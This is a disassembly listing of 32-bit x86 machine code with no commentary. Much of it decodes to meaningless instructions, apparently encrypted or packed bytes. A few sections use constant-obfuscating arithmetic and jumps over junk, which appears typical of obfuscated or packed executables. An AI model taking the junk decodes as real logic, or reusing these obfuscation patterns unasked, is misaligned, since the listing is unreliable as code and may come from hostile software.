  40b031:	pop    ebx
  40b032:	pop    ebp
  40b033:	(bad)  
  40b034:	pop    ss
  40b035:	sub    DWORD PTR [edx+ebx*2+0x56bc90fa],ecx
  40b03c:	lods   al,BYTE PTR ds:[esi]
  40b03d:	xor    al,0xe0
  40b03f:	xor    al,bh
  40b041:	mov    WORD PTR [edi+0x5a87c04b],es
  40b047:	in     al,dx
  40b048:	mov    edi,0x22c11320
  40b04d:	xchg   ebx,eax
  40b04e:	in     al,0xe7
  40b050:	mov    ah,0x8f
  40b052:	dec    esi
  40b054:	(bad)  
  40b055:	lahf   
  40b056:	in     al,0x16
  40b058:	retf   0x1aef
  40b05b:	lods   al,BYTE PTR ds:[esi]
  40b05c:	mov    ch,0x90
  40b05e:	retf   0x7cc0
  40b061:	je     0x40b013
  40b063:	mov    ebx,0x8dc6438c
  40b068:	and    eax,0x2a26ef03
  40b06d:	add    BYTE PTR [eax-0x3713d876],ah
  40b073:	pushf  
  40b074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b075:	es adc ebx,ebp
  40b078:	fiadd  DWORD PTR [eax]
  40b07a:	in     al,dx
  40b07b:	call   FWORD PTR [esi+0x2877a285]
  40b081:	jns    0x40b03b
  40b083:	outs   dx,BYTE PTR ds:[esi]
  40b084:	jmp    0x40b048
  40b086:	popa   
  40b087:	imul   ebp,DWORD PTR [ecx-0x14bc2ea1],0x604cc492
  40b091:	dec    ebp
  40b092:	xor    ah,bl
  40b094:	ret    0x5a27
  40b097:	outs   dx,BYTE PTR ds:[esi]
  40b098:	repz fsub DWORD PTR [ebp+0x51caea0a]
  40b09f:	data16 mov BYTE PTR [edx-0x18],dl
  40b0a3:	add    al,0x15
  40b0a5:	mul    DWORD PTR [ebx-0x4f]
  40b0a8:	sti    
  40b0a9:	mov    ah,0x1f
  40b0ab:	call   0x79ad0854
  40b0b0:	das    
  40b0b1:	mov    edx,0xcdde0b66
  40b0b6:	enter  0x56f3,0x8c
  40b0ba:	icebp  
  40b0bb:	out    0xa8,eax
  40b0bd:	push   edi
  40b0be:	ror    BYTE PTR [ecx-0x724df8c6],1
  40b0c4:	jb     0x40b0dd
  40b0c6:	sub    al,0x9e
  40b0c8:	out    0xcb,eax
  40b0ca:	dec    esp
  40b0cb:	and    ch,BYTE PTR ds:0x9641a297
  40b0d1:	add    al,0x94
  40b0d3:	or     eax,0x45939b1
  40b0d8:	(bad)  
  40b0d9:	push   ebx
  40b0da:	in     eax,0xc4
  40b0dc:	js     0x40b14e
  40b0de:	push   edx
  40b0df:	sbb    eax,0xc4e297e9
  40b0e4:	xchg   ebp,eax
  40b0e5:	in     al,0x3d
  40b0e7:	sbb    al,0x61
  40b0e9:	pop    edx
  40b0ea:	stos   DWORD PTR es:[edi],eax
  40b0eb:	push   eax
  40b0ec:	xor    al,BYTE PTR [esi]
  40b0ee:	mov    esp,0xb1a709ed
  40b0f3:	adc    bh,BYTE PTR [ebx]
  40b0f5:	or     al,0x14
  40b0f7:	ret    0x28ba
  40b0fa:	jmp    0x11a:0x51411dde
  40b101:	ja     0x40b0be
  40b103:	sbb    eax,0x5d2a176e
  40b108:	dec    edi
  40b109:	mov    gs,WORD PTR [esi+0x5d]
  40b10c:	call   0xd6da:0xeddb4ac4
  40b113:	clc    
  40b114:	push   ds
  40b115:	fidivr DWORD PTR [esi]
  40b117:	mov    ds:0xea90322d,ax
  40b11e:	inc    ebp
  40b11f:	push   esi
  40b120:	out    dx,al
  40b121:	xor    ebx,ebx
  40b123:	fist   WORD PTR [edx+0x26]
  40b126:	mov    cl,0xe
  40b128:	mov    ebp,0xdba1433c
  40b12d:	test   al,0xd8
  40b12f:	add    eax,0x4896
  40b134:	push   0x66667835
  40b139:	adc    edx,0x3f7c
  40b13f:	push   edx
  40b140:	push   eax
  40b141:	call   0x418100
  40b146:	mov    DWORD PTR [ebp-0x18],eax
  40b149:	mov    DWORD PTR [ebp-0x14],edx
  40b14c:	mov    DWORD PTR [ebp-0x40],0x7a72
  40b153:	mov    DWORD PTR [ebp-0x3c],0x400f
  40b15a:	mov    DWORD PTR [ebp-0x4],0x2a0
  40b161:	mov    DWORD PTR [ebp-0x8],0x990
  40b168:	mov    DWORD PTR [ebp-0x1c],0x7be4
  40b16f:	mov    DWORD PTR [ebp-0x38],0x2576
  40b176:	mov    DWORD PTR [ebp-0x24],0x48bd
  40b17d:	mov    DWORD PTR [ebp-0x48],0x2b6d
  40b184:	mov    DWORD PTR [ebp-0x2c],0x4582
  40b18b:	mov    DWORD PTR [ebp-0x4c],0x2ea4
  40b192:	mov    esi,DWORD PTR ds:0x422684
  40b198:	mov    ecx,DWORD PTR ds:0x422680
  40b19e:	mov    eax,ds:0x42267c
  40b1a3:	xor    edx,edx
  40b1a5:	div    ecx
  40b1a7:	mov    ecx,DWORD PTR ds:0x422678
  40b1ad:	mov    ebx,DWORD PTR ds:0x422674
  40b1b3:	push   0x16
  40b1b5:	pop    edi
  40b1b6:	add    esi,0x1ba0
  40b1bc:	and    esi,0x3acb
  40b1c2:	xor    ecx,eax
  40b1c4:	xor    ecx,0x7687
  40b1ca:	or     ebx,ecx
  40b1cc:	mov    ecx,DWORD PTR ds:0x42266c
  40b1d2:	mov    eax,ds:0x422670
  40b1d7:	imul   ecx,eax
  40b1da:	mov    eax,ds:0x422690
  40b1df:	imul   ecx,ecx,0x2f0f
  40b1e5:	mov    edx,DWORD PTR ds:0x42268c
  40b1eb:	or     eax,edx
  40b1ed:	xor    edx,edx
  40b1ef:	div    edi
  40b1f1:	add    ebx,0xffff8023
  40b1f7:	mov    edi,eax
  40b1f9:	mov    eax,DWORD PTR [ebp-0x8]
  40b1fc:	imul   edi,edi,0x348
  40b202:	mov    edx,DWORD PTR [ebp-0x4]
  40b205:	add    eax,esi
  40b207:	xor    eax,edx
  40b209:	mov    edx,DWORD PTR [ebp-0x34]
  40b20c:	xor    eax,0x1f83
  40b211:	lea    eax,[eax+edx*1-0x3139]
  40b218:	push   eax
  40b219:	mov    eax,DWORD PTR [ebp-0x44]
  40b21c:	mov    esi,DWORD PTR [ebp-0x40]
  40b21f:	or     edi,0x6e03
  40b225:	add    eax,ebx
  40b227:	push   eax
  40b228:	mov    edx,DWORD PTR [ebp-0x3c]
  40b22b:	xor    esi,0x1100
  40b231:	mov    eax,0x400
  40b236:	or     esi,eax
  40b238:	xor    esi,eax
  40b23a:	mov    eax,DWORD PTR [ebp-0x18]
  40b23d:	mov    edx,DWORD PTR [ebp-0x14]
  40b240:	or     esi,0x6aef
  40b246:	xor    esi,0x6bfb
  40b24c:	add    esi,eax
  40b24e:	push   esi
  40b24f:	mov    esi,DWORD PTR ds:0x422668
  40b255:	or     esi,ecx
  40b257:	lea    esi,[ebp+esi*1+0x40f92869]
  40b25e:	call   0x40c544
  40b263:	mov    ecx,DWORD PTR ds:0x422688
  40b269:	xor    ecx,edi
  40b26b:	sub    ecx,0x113e9e
  40b271:	cmp    eax,ecx
  40b273:	jne    0x40c533
  40b279:	mov    eax,ds:0x422694
  40b27e:	mov    ecx,DWORD PTR ds:0x422698
  40b284:	or     eax,ecx
  40b286:	mov    ecx,DWORD PTR [ebp-0x4c]
  40b289:	mov    edx,DWORD PTR [ebp-0x2c]
  40b28c:	or     ecx,edx
  40b28e:	mov    edx,DWORD PTR [ebp-0x48]
  40b291:	or     ecx,0x2391
  40b297:	lea    ecx,[ebp+ecx*1-0x98]
  40b29e:	lea    ecx,[ecx+edx*1-0x9b24]
  40b2a5:	push   ecx
  40b2a6:	mov    ecx,DWORD PTR [ebp-0x24]
  40b2a9:	or     eax,0x5112
  40b2ae:	imul   ecx,eax
  40b2b1:	mov    eax,ds:0x4222a8
  40b2b6:	xor    ecx,0x3174
  40b2bc:	sub    ecx,0x1b1038f6
  40b2c2:	push   ecx
  40b2c3:	add    eax,0xaa
  40b2c8:	jmp    0x40b63f
  40b2cd:	dec    eax
  40b2ce:	xchg   DWORD PTR [eax],ebx
  40b2d0:	cmp    al,0x1d
  40b2d2:	mov    ebp,0xb72fb76c
  40b2d7:	pop    ebp
  40b2d8:	inc    ebp
  40b2d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2da:	stc    
  40b2db:	sar    bl,1
  40b2dd:	mov    eax,0x66bbbba6
  40b2e2:	lds    edi,FWORD PTR [ebx-0x5625d45]
  40b2e8:	add    dl,BYTE PTR [esi+0x78]
  40b2eb:	jb     0x40b31d
  40b2ed:	mov    al,0xa
  40b2ef:	push   ss
  40b2f0:	push   ebx
  40b2f1:	and    DWORD PTR [edi],esi
  40b2f3:	aam    0x65
  40b2f5:	out    0x94,al
  40b2f7:	xor    ecx,DWORD PTR [ecx]
  40b2f9:	jns    0x40b31b
  40b2fb:	push   0x30
  40b2fd:	add    BYTE PTR [ecx+0x14],ch
  40b300:	inc    esi
  40b301:	(bad)  
  40b302:	push   esp
  40b303:	mov    edx,0x36c0f41b
  40b308:	or     dl,dh
  40b30a:	xor    DWORD PTR [ecx-0x59a0226e],esi
  40b310:	pop    eax
  40b311:	jns    0x40b2f3
  40b313:	cs dec esp
  40b315:	cwde   
  40b316:	jecxz  0x40b2e8
  40b318:	out    0xef,eax
  40b31a:	and    al,0x4f
  40b31c:	or     eax,0xdec74b5a
  40b321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b322:	adc    eax,0x7f3089b
  40b327:	jne    0x40b340
  40b329:	or     eax,DWORD PTR [ebx-0x3b]
  40b32c:	add    al,BYTE PTR [edi]
  40b32e:	pop    edi
  40b32f:	fild   WORD PTR [edx-0x46a8b66e]
  40b335:	popa   
  40b336:	sti    
  40b337:	call   0x1d7678ac
  40b33c:	mov    edx,0x531289b9
  40b341:	data16 sbb BYTE PTR [eax],0xff
  40b345:	hlt    
  40b346:	push   esp
  40b347:	inc    ecx
  40b348:	adc    al,0x4e
  40b34a:	push   ebp
  40b34b:	jg     0x40b2ee
  40b34d:	ds and eax,ecx
  40b350:	ret    0x8812
  40b353:	js     0x40b32c
  40b355:	das    
  40b356:	or     BYTE PTR [ebx+edi*8],dh
  40b359:	push   ds
  40b35a:	das    
  40b35b:	retf   0xd440
  40b35e:	dec    esi
  40b35f:	stos   BYTE PTR es:[edi],al
  40b360:	pop    esp
  40b361:	hlt    
  40b362:	repz std 
  40b364:	push   ebx
  40b365:	xchg   esi,eax
  40b366:	push   ebp
  40b367:	ja     0x40b348
  40b369:	push   ss
  40b36a:	xor    BYTE PTR [esi+0x75],al
  40b36d:	inc    esp
  40b36e:	test   edx,ebx
  40b370:	mov    bl,0xa7
  40b372:	inc    esp
  40b373:	cmp    eax,0x2e882a6f
  40b378:	es or  al,0x6e
  40b37b:	xor    DWORD PTR [ebx+ecx*1+0x6673a48f],ecx
  40b382:	fsub   QWORD PTR [edi]
  40b384:	(bad)  
  40b385:	daa    
  40b386:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40b388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b389:	jne    0x40b3ad
  40b38b:	loope  0x40b339
  40b38d:	fld    QWORD PTR [esi-0x49d64753]
  40b393:	mov    eax,ds:0xa395c0b5
  40b398:	adc    edi,ecx
  40b39a:	das    
  40b39b:	pop    es
  40b39c:	sub    al,0xd6
  40b39e:	jecxz  0x40b345
  40b3a0:	sti    
  40b3a1:	lds    esi,FWORD PTR [eax-0x60b9462e]
  40b3a7:	(bad)  
  40b3a8:	xchg   ecx,eax
  40b3a9:	inc    eax
  40b3aa:	es enter 0x10f0,0x9
  40b3af:	xor    eax,0x2ebe2973
  40b3b4:	inc    ebp
  40b3b5:	pop    ecx
  40b3b6:	out    dx,eax
  40b3b7:	sti    
  40b3b8:	lods   eax,DWORD PTR ds:[esi]
  40b3b9:	pop    ds
  40b3ba:	jae    0x40b400
  40b3bc:	popf   
  40b3bd:	xchg   DWORD PTR [eax-0x26],eax
  40b3c0:	setp   BYTE PTR ds:0x38c3cb59
  40b3c7:	repnz sub eax,0x1881598a
  40b3cd:	jl     0x40b351
  40b3cf:	jnp    0x40b41a
  40b3d1:	lods   al,BYTE PTR ds:[esi]
  40b3d2:	add    al,0xac
  40b3d4:	mov    ch,BYTE PTR [edx+0x4a667474]
  40b3da:	call   0x1798:0x50201f15
  40b3e1:	arpl   WORD PTR [ebp+ecx*2-0x6e],di
  40b3e5:	sbb    DWORD PTR [edx],0x4cd519e
  40b3eb:	push   edx
  40b3ec:	or     al,0x92
  40b3ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3ef:	jnp    0x40b46d
  40b3f1:	in     al,0x7c
  40b3f3:	pop    edi
  40b3f4:	add    al,dl
  40b3f6:	ror    ebx,0xf6
  40b3f9:	xor    eax,0xebcee22d
  40b3fe:	mov    eax,ds:0x1487a980
  40b403:	mov    cl,0x21
  40b405:	add    eax,0xb5ceb477
  40b40a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b40b:	shl    BYTE PTR ds:0x687889bb,1
  40b411:	dec    ebx
  40b412:	inc    ebx
  40b413:	pop    esi
  40b414:	sbb    eax,0x394f335
  40b419:	and    eax,0x58f817a0
  40b41e:	pop    esp
  40b41f:	imul   edx,DWORD PTR [eax+0x60],0xb90aa664
  40b426:	mov    al,0x3b
  40b428:	jle    0x40b3ff
  40b42a:	(bad)  
  40b42b:	ss out 0x5b,al
  40b42e:	cmc    
  40b42f:	sbb    al,0x9b
  40b431:	add    al,0xa8
  40b433:	push   es
  40b434:	dec    esp
  40b435:	cmp    DWORD PTR [edi+esi*2-0x111612fd],ebp
  40b43c:	pop    ds
  40b43d:	pop    ecx
  40b43e:	lahf   
  40b43f:	lea    esi,[ecx+0x25]
  40b442:	rol    DWORD PTR [ebp-0x1c71c7ff],1
  40b448:	mov    ah,0xd9
  40b44a:	jnp    0x40b3f3
  40b44c:	loopne 0x40b3dd
  40b44e:	pop    es
  40b44f:	jl     0x40b419
  40b451:	jnp    0x40b42b
  40b453:	jp     0x40b4a4
  40b455:	xchg   ecx,eax
  40b456:	popf   
  40b457:	dec    esp
  40b458:	add    DWORD PTR [ebp-0xb],0xffffffb5
  40b45c:	mov    esp,DWORD PTR [esi+0x11]
  40b45f:	ja     0x40b48b
  40b461:	lods   al,BYTE PTR ds:[esi]
  40b462:	fistp  WORD PTR [eax+0x72]
  40b465:	sub    eax,0x93b77989
  40b46a:	and    al,0x4f
  40b46c:	or     DWORD PTR [ecx+0x4c],ebx
  40b46f:	jp     0x40b4d2
  40b471:	fmul   DWORD PTR [ebx-0x1]
  40b474:	cmp    BYTE PTR [edx-0x42142cb7],dl
  40b47a:	inc    edx
  40b47b:	out    dx,eax
  40b47c:	aam    0xa3
  40b47e:	rol    BYTE PTR [ecx+esi*1+0xa],1
  40b482:	fs jae 0x40b4af
  40b485:	mov    edx,0x4d793b22
  40b48a:	ins    BYTE PTR es:[edi],dx
  40b48b:	cmp    BYTE PTR [edx+0x9],bl
  40b48e:	jg     0x40b4b9
  40b490:	jmp    0xdbec:0x4c7a1576
  40b497:	pusha  
  40b498:	lods   eax,DWORD PTR ds:[esi]
  40b499:	push   0x75a0b5f2
  40b49e:	cmp    dl,al
  40b4a0:	mov    esi,0x39f6a33a
  40b4a5:	stos   DWORD PTR es:[edi],eax
  40b4a6:	cmp    al,0x3a
  40b4a8:	xor    eax,0x2df29bf7
  40b4ad:	aaa    
  40b4ae:	pop    esi
  40b4af:	push   ebp
  40b4b0:	add    eax,0x8bae68e0
  40b4b5:	jp     0x40b48f
  40b4b7:	fst    QWORD PTR [eax-0x7d]
  40b4ba:	out    dx,al
  40b4bb:	jb     0x40b50e
  40b4bd:	test   BYTE PTR [edx+0x557e9a69],bl
  40b4c3:	pop    es
  40b4c4:	xchg   esi,eax
  40b4c5:	cmp    BYTE PTR [esi-0x5e],bh
  40b4c8:	mov    edx,eax
  40b4ca:	sbb    al,0x21
  40b4cc:	inc    ecx
  40b4cd:	jns    0x40b49b
  40b4cf:	jbe    0x40b51e
  40b4d1:	scas   al,BYTE PTR es:[edi]
  40b4d2:	add    DWORD PTR [ebx+0x7da934a4],edi
  40b4d8:	sub    ebx,ecx
  40b4da:	mov    es,WORD PTR [edx+0x1840468f]
  40b4e0:	xchg   edx,eax
  40b4e1:	es pop ss
  40b4e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4e4:	push   edi
  40b4e5:	popf   
  40b4e6:	leave  
  40b4e7:	rcr    BYTE PTR [esi+0x2329e925],1
  40b4ed:	cmc    
  40b4ee:	dec    esi
  40b4ef:	shl    DWORD PTR [esi+0x4ef7cafb],0x55
  40b4f6:	cmp    al,0x56
  40b4f8:	mov    ?,WORD PTR [edx-0x163277ee]
  40b4fe:	shl    DWORD PTR [esi+0x231de3c],cl
  40b504:	test   DWORD PTR [ebp+esi*2+0x4b682fac],esp
  40b50b:	push   ecx
  40b50c:	sub    dl,BYTE PTR [edi]
  40b50e:	sub    DWORD PTR [eax],ebx
  40b510:	clc    
  40b511:	jp     0x40b4c8
  40b513:	mov    bh,0x45
  40b515:	cmp    eax,0xc873b771
  40b51a:	sub    eax,0xff5f5341
  40b51f:	xor    bl,dl
  40b521:	or     al,0xea
  40b523:	idiv   BYTE PTR [edi+0x56]
  40b526:	loop   0x40b4ad
  40b528:	inc    edi
  40b529:	add    dl,BYTE PTR [edi]
  40b52b:	outs   dx,BYTE PTR ds:[esi]
  40b52c:	jb     0x40b517
  40b52e:	mov    ah,BYTE PTR [eax-0xd]
  40b531:	xchg   ebx,eax
  40b532:	mov    bl,0x5a
  40b534:	cmp    al,0x34
  40b536:	rcl    BYTE PTR [eax-0x3bd0b653],cl
  40b53c:	ret    
  40b53d:	ror    BYTE PTR [edi],0x59
  40b540:	jnp    0x40b54e
  40b542:	out    dx,al
  40b543:	lods   al,BYTE PTR ds:[esi]
  40b544:	gs adc ch,bh
  40b547:	pushf  
  40b548:	cld    
  40b549:	lock cmc 
  40b54b:	sbb    ebx,DWORD PTR [edi-0x63]
  40b54e:	push   ebp
  40b54f:	mov    ds:0x52d6693e,eax
  40b554:	fsub   QWORD PTR [eax+0x23]
  40b557:	xchg   edx,eax
  40b558:	push   eax
  40b559:	push   edx
  40b55a:	mov    cl,0xac
  40b55c:	adc    DWORD PTR [edx-0x30],edi
  40b55f:	popa   
  40b560:	inc    edx
  40b561:	fisttp QWORD PTR [ebx]
  40b563:	stos   BYTE PTR es:[edi],al
  40b564:	add    eax,0x87c39cbe
  40b569:	outs   dx,DWORD PTR ds:[esi]
  40b56a:	test   al,0x96
  40b56c:	sbb    ecx,DWORD PTR ds:0x6b4b2aff
  40b572:	fsubr  st(0),st
  40b574:	inc    edi
  40b575:	lods   eax,DWORD PTR ds:[esi]
  40b576:	sti    
  40b577:	sti    
  40b578:	cli    
  40b579:	vmaxss xmm3,xmm2,DWORD PTR [ebp+0x5e]
  40b57e:	pop    esp
  40b57f:	icebp  
  40b580:	fist   WORD PTR [eax+0x2c]
  40b583:	in     eax,dx
  40b584:	imul   edx,DWORD PTR [edx+0x53226778],0xeec73f30
  40b58e:	lods   eax,DWORD PTR ds:[esi]
  40b58f:	mov    dl,0xd9
  40b591:	adc    dl,ch
  40b593:	mov    ebx,?
  40b595:	mov    ah,0xa0
  40b597:	xchg   ebx,eax
  40b598:	out    0xef,eax
  40b59a:	cld    
  40b59b:	adc    eax,0x5d6029a1
  40b5a0:	and    esp,esi
  40b5a2:	mov    ch,0x5e
  40b5a4:	cwde   
  40b5a5:	adc    DWORD PTR [edi],edi
  40b5a7:	cmp    DWORD PTR [ecx-0x54],ecx
  40b5aa:	mov    dh,0x6e
  40b5ac:	push   DWORD PTR [ecx+0x466c2dac]
  40b5b2:	mov    ds:0x90cd0513,eax
  40b5b7:	mov    eax,ds:0x14173900
  40b5bc:	pop    ss
  40b5bd:	lea    esp,[edx]
  40b5bf:	(bad)  
  40b5c0:	pop    esi
  40b5c1:	repnz outs dx,DWORD PTR ds:[esi]
  40b5c3:	test   eax,0x3c87ee58
  40b5c8:	inc    esp
  40b5c9:	adc    BYTE PTR [esi+0x5339bc4a],dl
  40b5cf:	push   ebx
  40b5d0:	push   edi
  40b5d1:	lahf   
  40b5d2:	add    ch,BYTE PTR [ecx-0x6d314e8b]
  40b5d8:	mov    cl,0x74
  40b5da:	xchg   esp,eax
  40b5db:	and    DWORD PTR [edi],eax
  40b5dd:	call   0x4640f361
  40b5e2:	lds    eax,FWORD PTR [edx+0x1d84415b]
  40b5e8:	dec    ebx
  40b5e9:	push   cs
  40b5ea:	(bad)
  40b5ef:	dec    ebx
  40b5f0:	dec    edx
  40b5f1:	stc    
  40b5f2:	cmp    BYTE PTR [edi-0x47],0x83
  40b5f6:	nop
  40b5f7:	and    eax,0x9a437617
  40b5fc:	xor    al,0xb0
  40b5fe:	cmp    eax,0x989c4eee
  40b603:	aas    
  40b604:	pop    edi
  40b605:	mov    DWORD PTR [edi+0x6339b433],esp
  40b60b:	cmc    
  40b60c:	inc    ebp
  40b60d:	cwde   
  40b60e:	aaa    
  40b60f:	mov    edx,0x6ea0d5f9
  40b614:	push   ecx
  40b615:	popa   
  40b616:	jno    0x40b640
  40b618:	ds daa 
  40b61a:	les    edx,FWORD PTR [ebx+0x60647d5b]
  40b620:	ret    
  40b621:	sbb    bl,0x67
  40b624:	icebp  
  40b625:	sub    al,0x8d
  40b627:	test   bh,ch
  40b629:	arpl   ax,sp
  40b62b:	lods   al,BYTE PTR ds:[esi]
  40b62c:	jno    0x40b5bc
  40b62e:	call   0x62a81aa3
  40b633:	jo     0x40b5e5
  40b635:	ret    0x7ee
  40b638:	sub    DWORD PTR [eax+0x3c6d5112],ecx
  40b63e:	sahf   
  40b63f:	push   eax
  40b640:	mov    eax,DWORD PTR [ebp-0x38]
  40b643:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b646:	xor    eax,0x50aa
  40b64b:	sub    eax,ecx
  40b64d:	xor    edx,edx
  40b64f:	mov    ecx,0xb19ab
  40b654:	div    ecx
  40b656:	mov    ecx,DWORD PTR ds:0x4222a8
  40b65c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  40b662:	sub    ecx,eax
  40b664:	push   DWORD PTR [ecx+0x1710]
  40b66a:	call   0x41d6cc
  40b66f:	mov    DWORD PTR [ebp-0x4],eax
  40b672:	mov    ecx,DWORD PTR ds:0x4223b0
  40b678:	lea    eax,[ebp+0x4]
  40b67b:	mov    DWORD PTR [ecx*4+0x4223a8],eax
  40b682:	inc    DWORD PTR ds:0x4223b0
  40b688:	mov    eax,DWORD PTR [ebp-0x4]
  40b68b:	mov    eax,DWORD PTR [ebp-0x4]
  40b68e:	xor    edx,edx
  40b690:	shld   edx,eax,0x2
  40b694:	shl    eax,0x2
  40b697:	mov    ecx,0xcb89b676
  40b69c:	mov    esi,0x9d2b8af8
  40b6a1:	xor    eax,ecx
  40b6a3:	xor    edx,esi
  40b6a5:	cmp    eax,ecx
  40b6a7:	jne    0x40b6c1
  40b6ad:	cmp    edx,esi
  40b6af:	jne    0x40b6c1
  40b6b5:	mov    eax,0xcb89b672
  40b6ba:	mov    edx,esi
  40b6bc:	jmp    0x40c53d
  40b6c1:	lea    eax,[ebp-0xc]
  40b6c4:	mov    DWORD PTR [ebp-0x50],eax
  40b6c7:	mov    eax,DWORD PTR [ebp-0x28]
  40b6ca:	mov    DWORD PTR [ebp-0xc],eax
  40b6cd:	mov    eax,DWORD PTR [ebp-0xc]
  40b6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  40b6d3:	sub    eax,ecx
  40b6d5:	mov    DWORD PTR [ebp-0xc],eax
  40b6d8:	mov    eax,DWORD PTR [ebp-0x18]
  40b6db:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6de:	sub    DWORD PTR [ebp-0xc],eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x4]
  40b6e4:	mov    DWORD PTR [eax],0x658776e9
  40b6ea:	mov    DWORD PTR [eax+0x4],0xab756547
  40b6f1:	mov    eax,DWORD PTR [ebp-0xc]
  40b6f4:	jmp    0x40ba6b
  40b6f9:	aas    
  40b6fa:	or     al,0xdf
  40b6fc:	mov    edx,0x8c5f29ad
  40b701:	pop    esp
  40b702:	hlt    
  40b703:	mov    ecx,0x49ba602f
  40b708:	add    eax,0xbbbbb065
  40b70d:	lds    di,DWORD PTR [ebx-0x240e7445]
  40b714:	adc    BYTE PTR [ebx+0x73],bl
  40b717:	mov    edi,cs
  40b719:	jne    0x40b741
  40b71b:	stos   BYTE PTR es:[edi],al
  40b71c:	ins    BYTE PTR es:[edi],dx
  40b71d:	cld    
  40b71e:	cmp    eax,0x6d13caa5
  40b723:	(bad)  
  40b724:	push   edx
  40b725:	mov    ebx,0x68e61d7e
  40b72a:	aaa    
  40b72b:	ret    0x5eb
  40b72e:	cs xor bh,bh
  40b731:	sub    al,0x30
  40b733:	(bad)  
  40b735:	test   eax,0xaaf30e0
  40b73a:	cmp    BYTE PTR [edi+0x2b4597b],0xc6
  40b741:	es dec esi
  40b743:	imul   ecx,DWORD PTR [ebx-0x59],0x7f
  40b747:	xor    eax,esi
  40b749:	imul   BYTE PTR [edx]
  40b74b:	(bad)  
  40b74e:	mov    esp,0xd4c3851f
  40b753:	inc    ebx
  40b754:	imul   esi,DWORD PTR gs:[ecx],0xa56d5b71
  40b75b:	pop    edi
  40b75c:	test   DWORD PTR [edx],edi
  40b75e:	sar    DWORD PTR [ebp-0xa],0xdc
  40b762:	cdq    
  40b763:	ret    0x43d1
  40b766:	(bad)  
  40b767:	rcr    cl,1
  40b769:	mov    ebx,0x3638c787
  40b76e:	bnd jbe 0x40b70e
  40b771:	inc    edx
  40b772:	ins    BYTE PTR es:[edi],dx
  40b773:	imul   edx,ebp,0x78
  40b776:	inc    edx
  40b777:	mov    edx,0x55f3d339
  40b77c:	in     al,dx
  40b77d:	jnp    0x40b7c9
  40b77f:	sbb    esp,ecx
  40b781:	dec    eax
  40b782:	test   DWORD PTR [esi],edi
  40b784:	or     BYTE PTR [edx-0x31],bh
  40b787:	inc    ecx
  40b788:	jno    0x40b736
  40b78a:	or     DWORD PTR [eax+edx*4],eax
  40b78d:	int    0x6c
  40b78f:	out    0x36,eax
  40b791:	pop    eax
  40b792:	test   BYTE PTR [ebp-0x7c],cl
  40b795:	(bad)  
  40b796:	outs   dx,DWORD PTR ds:[esi]
  40b797:	fld    TBYTE PTR [eax-0x4f]
  40b79a:	mov    ebx,0x4fcf5121
  40b79f:	movhps QWORD PTR [ebx-0x48],xmm7
  40b7a3:	mov    cl,0xbc
  40b7a5:	and    al,0xbd
  40b7a7:	mov    eax,0x903bbfda
  40b7ac:	mov    edi,0xd7c94d9f
  40b7b1:	cmp    al,0xe7
  40b7b3:	sbb    ah,al
  40b7b5:	scas   eax,DWORD PTR es:[edi]
  40b7b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7b7:	cld    
  40b7b8:	sbb    DWORD PTR [ebx+ebx*1+0x68],ecx
  40b7bc:	pusha  
  40b7bd:	cwde   
  40b7be:	in     eax,0xed
  40b7c0:	jns    0x40b756
  40b7c2:	inc    ecx
  40b7c3:	popf   
  40b7c4:	and    BYTE PTR [esi-0x6e],0x94
  40b7c8:	jp     0x40b7d9
  40b7ca:	dec    ebx
  40b7cb:	hlt    
  40b7cc:	popa   
  40b7cd:	push   0x4d
  40b7cf:	jnp    0x40b7a8
  40b7d1:	js     0x40b7d4
  40b7d3:	jo     0x40b7c8
  40b7d5:	popf   
  40b7d6:	fnstcw WORD PTR [edi+0x6b]
  40b7d9:	(bad)  
  40b7da:	cld    
  40b7db:	push   0xca5515a7
  40b7e0:	xchg   edi,eax
  40b7e1:	leave  
  40b7e2:	jae    0x40b83f
  40b7e4:	scas   eax,DWORD PTR es:[edi]
  40b7e5:	xor    DWORD PTR [edi-0x6f95ec8b],esi
  40b7eb:	cmc    
  40b7ec:	sub    al,0xea
  40b7ee:	xor    ebp,DWORD PTR [eax+0x22d45c98]
  40b7f4:	retf   
  40b7f5:	out    dx,al
  40b7f6:	rcr    DWORD PTR gs:[edx-0x4151ce86],1
  40b7fd:	jns    0x40b84d
  40b7ff:	mov    ds:0xcf53da4d,al
  40b804:	aaa    
  40b805:	dec    eax
  40b806:	cmc    
  40b807:	push   es
  40b808:	gs pop es
  40b80a:	data16 sub ch,BYTE PTR [esi+0x6383da09]
  40b811:	push   ebx
  40b812:	fiadd  WORD PTR [eax]
  40b814:	xchg   ecx,eax
  40b815:	call   0x6fbf:0x38b8eff
  40b81c:	es push ss
  40b81e:	(bad)  
  40b81f:	shl    DWORD PTR [ecx-0x3c1f9d97],0x89
  40b826:	push   cs
  40b827:	(bad)  
  40b829:	scas   eax,DWORD PTR es:[edi]
  40b82a:	dec    eax
  40b82b:	in     eax,dx
  40b82c:	ror    BYTE PTR [edi+0x6a],1
  40b82f:	jne    0x40b804
  40b831:	fsubr  DWORD PTR [edi+0x19]
  40b834:	dec    eax
  40b835:	inc    esi
  40b836:	aas    
  40b837:	push   cs
  40b838:	invd   
  40b83a:	lea    ebx,ds:0xbca8a789
  40b840:	(bad)  
  40b841:	push   ebx
  40b842:	mov    ah,0x11
  40b844:	call   0xe4478a5c
  40b849:	adc    eax,0xc9d0fd3a
  40b84e:	add    cl,bh
  40b850:	idiv   bh
  40b852:	add    DWORD PTR [ebp+edi*8-0x7a674415],ecx
  40b859:	les    ecx,FWORD PTR [edi+0x6e]
  40b85c:	adc    bl,ch
  40b85e:	ficomp WORD PTR [edi+0x27d8cdd7]
  40b864:	or     al,0x9
  40b867:	mov    cx,0xf3fc
  40b86b:	stos   BYTE PTR es:[edi],al
  40b86c:	retf   
  40b86d:	(bad)  [ecx]
